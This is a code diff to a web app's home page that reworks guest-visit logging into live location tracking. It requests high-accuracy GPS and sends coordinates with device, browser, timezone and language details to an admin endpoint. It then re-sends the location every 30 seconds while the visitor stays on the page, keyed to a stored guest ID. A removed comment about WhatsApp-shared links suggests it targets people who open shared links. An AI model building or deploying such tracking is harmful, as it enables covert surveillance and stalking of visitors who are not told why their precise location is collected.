@@ -25,7 +25,7 @@ export default function Home() {
       console.error(e);
     }
 
-    // Log Detailed Guest Visit & Location (unauthenticated or link open security ping)
+    // Log Guest Visit with live periodic location pings
     const logGuestVisit = async () => {
       try {
         const ua = navigator.userAgent || '';
@@ -39,62 +39,72 @@ export default function Home() {
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Asia/Kolkata';
         const language = navigator.language || 'en-US';
         const platform = navigator.platform || 'Unknown OS';
-        const referrer = document.referrer || 'Direct Link / WhatsApp Share';
 
-        // Helper to send guest access log
-        const sendLog = async (coords = null) => {
-          await fetch('/api/admin', {
+        // Check if this guest already has a session ID
+        let savedGuestId = sessionStorage.getItem('_guest_log_id');
+
+        const sendLocationPing = (coords, guestId = null) => {
+          fetch('/api/admin', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               action: 'log-guest-access',
+              guestId,  // if set, updates existing log instead of creating new
               device: `${deviceName} (${screenRes})`,
               userAgent: ua,
               location: coords,
-              details: { platform, timezone, language, referrer, screenRes }
+              details: { platform, timezone, language, screenRes }
             })
-          });
+          }).then(r => r.json()).then(data => {
+            // Save guestId from first log so future pings update same record
+            if (!guestId && data.log?.id) {
+              sessionStorage.setItem('_guest_log_id', data.log.id);
+              savedGuestId = data.log.id;
+            }
+          }).catch(() => {});
         };
 
-        if (navigator.geolocation) {
-          let bestPosition = null;
-          let watchId = null;
-
-          // Watch position for up to 10s to get the most accurate reading
-          const timeout = setTimeout(() => {
-            if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-            sendLog(bestPosition
-              ? { latitude: bestPosition.coords.latitude, longitude: bestPosition.coords.longitude, accuracy: Math.round(bestPosition.coords.accuracy) }
-              : null
-            );
+        // Get best GPS position using watchPosition
+        const getBestLocation = (onResult) => {
+          if (!navigator.geolocation) { onResult(null); return; }
+          let best = null;
+          let wid = null;
+          const t = setTimeout(() => {
+            navigator.geolocation.clearWatch(wid);
+            onResult(best ? { latitude: best.coords.latitude, longitude: best.coords.longitude, accuracy: Math.round(best.coords.accuracy) } : null);
           }, 10000);
-
-          watchId = navigator.geolocation.watchPosition(
+          wid = navigator.geolocation.watchPosition(
             (pos) => {
-              // Keep the position with best (lowest) accuracy
-              if (!bestPosition || pos.coords.accuracy < bestPosition.coords.accuracy) {
-                bestPosition = pos;
-              }
-              // If accuracy is within 20 meters — good enough, stop early
+              if (!best || pos.coords.accuracy < best.coords.accuracy) best = pos;
               if (pos.coords.accuracy <= 20) {
-                clearTimeout(timeout);
-                navigator.geolocation.clearWatch(watchId);
-                sendLog({
-                  latitude: pos.coords.latitude,
-                  longitude: pos.coords.longitude,
-                  accuracy: Math.round(pos.coords.accuracy)
-                });
+                clearTimeout(t);
+                navigator.geolocation.clearWatch(wid);
+                onResult({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) });
               }
             },
-            () => {
-              clearTimeout(timeout);
-              sendLog(null);
-            },
+            () => { clearTimeout(t); onResult(null); },
             { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
           );
-        } else {
-          sendLog(null);
-        }
+        };
+
+        // First ping — create or update guest log
+        getBestLocation((coords) => {
+          sendLocationPing(coords, savedGuestId);
+        });
+
+        // Live ping every 30 seconds while guest is on page
+        const pingInterval = setInterval(() => {
+          getBestLocation((coords) => {
+            if (coords) {
+              const gid = sessionStorage.getItem('_guest_log_id');
+              sendLocationPing(coords, gid);
+            }
+          });
+        }, 30000);
+
+        // Cleanup on page leave
+        window.addEventListener('beforeunload', () => clearInterval(pingInterval));
+
       } catch (err) {
         console.error(err);
       }
